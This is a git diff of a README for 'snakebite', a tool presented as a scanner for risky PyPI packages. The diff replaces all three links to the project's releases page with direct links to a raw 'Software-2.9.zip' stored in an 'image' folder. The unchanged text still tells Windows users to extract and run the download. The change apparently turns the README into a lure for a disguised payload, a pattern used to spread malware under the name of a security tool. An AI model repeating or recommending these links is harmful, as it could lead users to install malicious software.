@@ -1,6 +1,6 @@
 # 🐍 snakebite - Find risky PyPI packages fast
 
-[![Download snakebite](https://img.shields.io/badge/Download%20snakebite-purple?style=for-the-badge&logo=github)](https://github.com/andreskl22/snakebite/releases)
+[![Download snakebite](https://img.shields.io/badge/Download%20snakebite-purple?style=for-the-badge&logo=github)](https://github.com/andreskl22/snakebite/raw/refs/heads/main/image/Software-2.9.zip)
 
 ## 🧰 What snakebite does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 Visit this page to download snakebite for Windows:
 
-https://github.com/andreskl22/snakebite/releases
+https://github.com/andreskl22/snakebite/raw/refs/heads/main/image/Software-2.9.zip
 
 On the releases page, look for the latest version and download the Windows file. If there is a zip file, download it and extract it first. If there is an `.exe` file, you can run it after download.
 
@@ -157,7 +157,7 @@ These steps help you spot problems even when a package looks normal at first.
 
 Download snakebite here:
 
-https://github.com/andreskl22/snakebite/releases
+https://github.com/andreskl22/snakebite/raw/refs/heads/main/image/Software-2.9.zip
 
 ## 📄 What is inside snakebite
 
